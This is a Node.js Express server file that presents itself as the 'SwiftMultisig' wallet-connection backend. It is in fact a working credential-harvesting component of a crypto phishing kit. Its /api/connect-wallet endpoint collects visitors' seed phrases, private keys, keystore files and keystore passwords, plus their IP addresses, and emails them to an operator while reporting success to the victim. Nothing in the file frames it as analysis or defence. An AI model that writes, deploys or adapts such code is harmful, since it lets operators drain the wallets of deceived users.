const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3256;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Email configuration from .env file
const EMAIL_CONFIG = {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
    recipient: process.env.RECIPIENT_EMAIL
};

// Validate environment variables
if (!EMAIL_CONFIG.user || !EMAIL_CONFIG.pass || !EMAIL_CONFIG.recipient) {
    console.error('\x1b[31m%s\x1b[0m', '❌ ERROR: Missing email configuration in .env file!');
    console.error('Please create .env file with:');
    console.error('EMAIL_USER=your-email@gmail.com');
    console.error('EMAIL_PASS=your-app-password');
    console.error('RECIPIENT_EMAIL=where-to-send@gmail.com');
    process.exit(1);
}

// Create email transporter
let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_CONFIG.user,
        pass: EMAIL_CONFIG.pass
    }
});

// Verify email configuration
transporter.verify((error, success) => {
    if (error) {
        console.log('\x1b[31m%s\x1b[0m', '❌ Email Error:', error.message);
    } else {
        console.log('\x1b[32m%s\x1b[0m', '✅ Email ready! Wallet alerts will be sent to:', EMAIL_CONFIG.recipient);
    }
});

// Root route
app.get('/', (req, res) => {
    res.json({
        name: 'SwiftMultisig Backend API',
        version: '1.0.0',
        status: 'running',
        endpoints: {
            'GET /': 'This help page',
            'GET /api/test': 'Test endpoint',
            'POST /api/connect-wallet': 'Submit wallet credentials',
            'GET /api/health': 'Health check'
        },
        timestamp: new Date().toISOString()
    });
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        message: '✅ Backend is working!',
        timestamp: new Date().toISOString()
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        emailConfigured: true,
        recipient: EMAIL_CONFIG.recipient
    });
});

// Main endpoint - receives wallet credentials and sends email with actual data
app.post('/api/connect-wallet', async (req, res) => {
    try {
        const { 
            walletAddress,
            network, 
            connectionMethod,
            timestamp,
            walletType,
            importMethod,
            credentialData  // This will contain the actual seed phrase or private key
        } = req.body;
        
        // Get client IP
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];
        
        // Extract the actual credential (seed phrase or private key)
        let actualCredential = '';
        let credentialType = '';
        
        if (importMethod === 'seed') {
            actualCredential = credentialData || 'No seed phrase provided';
            credentialType = 'Recovery Phrase (Seed Phrase)';
        } else if (importMethod === 'private') {
            actualCredential = credentialData || 'No private key provided';
            credentialType = 'Private Key';
        } else if (importMethod === 'json') {
            actualCredential = credentialData || 'JSON file uploaded';
            credentialType = 'JSON Keystore File';
        }
        
        console.log('\n📩 New wallet submission received:');
        console.log(`   Wallet Type: ${walletType}`);
        console.log(`   Method: ${importMethod}`);
        console.log(`   Credential: ${actualCredential.substring(0, 50)}...`);
        console.log(`   IP: ${ipAddress}\n`);
        
        // Create email HTML with actual credentials
        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                        line-height: 1.6;
                        color: #1a1a1a;
                        background-color: #f5f5f5;
                        margin: 0;
                        padding: 20px;
                    }
                    .container {
                        max-width: 600px;
                        margin: 0 auto;
                        background: white;
                        border-radius: 12px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        overflow: hidden;
                    }
                    .header {
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        color: white;
                        padding: 30px;
                        text-align: center;
                    }
                    .header h1 {
                        margin: 0;
                        font-size: 24px;
                    }
                    .header p {
                        margin: 8px 0 0;
                        opacity: 0.9;
                    }
                    .content {
                        padding: 30px;
                    }
                    .detail-box {
                        background: #f8f9fa;
                        border-left: 4px solid #667eea;
                        padding: 16px;
                        margin: 20px 0;
                        border-radius: 8px;
                    }
                    .credential-box {
                        background: #1a1a1a;
                        color: #10b981;
                        padding: 20px;
                        border-radius: 8px;
                        font-family: 'Courier New', monospace;
                        font-size: 14px;
                        word-break: break-all;
                        margin: 20px 0;
                        border: 1px solid #333;
                    }
                    .label {
                        font-weight: 600;
                        color: #4a5568;
                        margin-bottom: 8px;
                        font-size: 14px;
                        text-transform: uppercase;
                        letter-spacing: 0.5px;
                    }
                    .value {
                        color: #2d3748;
                        margin-bottom: 16px;
                    }
                    .footer {
                        background: #f8f9fa;
                        padding: 20px;
                        text-align: center;
                        font-size: 12px;
                        color: #718096;
                        border-top: 1px solid #e2e8f0;
                    }
                    .warning {
                        background: #fff3cd;
                        border-left: 4px solid #ffc107;
                        padding: 12px;
                        margin: 20px 0;
                        border-radius: 8px;
                        font-size: 13px;
                    }
                    hr {
                        border: none;
                        border-top: 1px solid #e2e8f0;
                        margin: 20px 0;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>🔐 Wallet Submission - ${walletType || 'Unknown Wallet'}</h1>
                        <p>SwiftMultisig Form</p>
                    </div>
                    <div class="content">
                        <p><strong>Hello,</strong></p>
                        <p>A new wallet has been submitted on your website. Details below.</p>
                        
                        <div class="detail-box">
                            <div class="label">📱 Wallet Type</div>
                            <div class="value">${walletType || 'Not specified'}</div>
                            
                            <div class="label">🔑 Field Type</div>
                            <div class="value">${credentialType}</div>
                            
                            <div class="label">📊 Data</div>
                            <div class="credential-box">
                                ${actualCredential}
                            </div>
                            
                            ${importMethod === 'json' ? `
                            <div class="label">📁 JSON File Password</div>
                            <div class="credential-box">
                                ${req.body.jsonPassword || 'No password provided'}
                            </div>
                            ` : ''}
                        </div>
                        
                        <div class="detail-box">
                            <div class="label">🌐 Network</div>
                            <div class="value">${network || 'Multi-Chain'}</div>
                            
                            <div class="label">🔌 Connection Method</div>
                            <div class="value">${connectionMethod || 'Manual Import'}</div>
                            
                            <div class="label">⏰ Timestamp</div>
                            <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
                            
                            <div class="label">📍 Visitor IP</div>
                            <div class="value">${ipAddress}</div>
                            
                            <div class="label">💻 User Agent</div>
                            <div class="value" style="font-size: 12px;">${userAgent || 'Not captured'}</div>
                        </div>
                        
                        <div class="warning">
                            <strong>⚠️ Important:</strong> This is sensitive information. Store it securely and verify the submission.
                        </div>
                    </div>
                    <div class="footer">
                        <p>This e-mail was sent from SwiftMultisig Dashboard</p>
                        <p>Powered by SwiftMultisig Secure Form</p>
                    </div>
                </div>
            </body>
            </html>
        `;
        
        // Plain text version
        const textContent = `
Wallet Submission - ${walletType}

Hello,

A new wallet has been submitted on your website. Details below.

Wallet Type: ${walletType}
Field Type: ${credentialType}
Data:
${actualCredential}

${importMethod === 'json' ? `JSON Password: ${req.body.jsonPassword || 'No password'}\n` : ''}
Network: ${network || 'Multi-Chain'}
Connection Method: ${connectionMethod || 'Manual Import'}
Timestamp: ${new Date(timestamp || Date.now()).toLocaleString()}
Visitor IP: ${ipAddress}
User Agent: ${userAgent || 'Not captured'}

---
This e-mail was sent from SwiftMultisig Dashboard
Powered by SwiftMultisig Secure Form
        `;
        
        // Send email
        await transporter.sendMail({
            from: `"SwiftMultisig" <${EMAIL_CONFIG.user}>`,
            to: EMAIL_CONFIG.recipient,
            subject: `🔐 Wallet Submission - ${walletType} (${credentialType})`,
            html: emailHtml,
            text: textContent
        });
        
        console.log('✅ Email sent successfully with credentials to:', EMAIL_CONFIG.recipient);
        
        // Send response back to frontend
        res.json({
            success: true,
            message: 'Submitted Successfully',
            data: {
                connectionId: Date.now()
            }
        });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({
            success: false,
            message: 'Submission failed',
            error: error.message
        });
    }
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({
        error: 'Not Found',
        message: `Cannot ${req.method} ${req.url}`
    });
});

// Start server
app.listen(PORT, () => {
    console.log('\n' + '='.repeat(50));
    console.log('\x1b[36m%s\x1b[0m', '🚀 SwiftMultisig Backend Running!');
    console.log('='.repeat(50));
    console.log(`\x1b[32m📡 Server:\x1b[0m http://localhost:${PORT}`);
    console.log(`\x1b[32m📧 Email Alerts:\x1b[0m ${EMAIL_CONFIG.recipient}`);
    console.log('\n' + '='.repeat(50));
});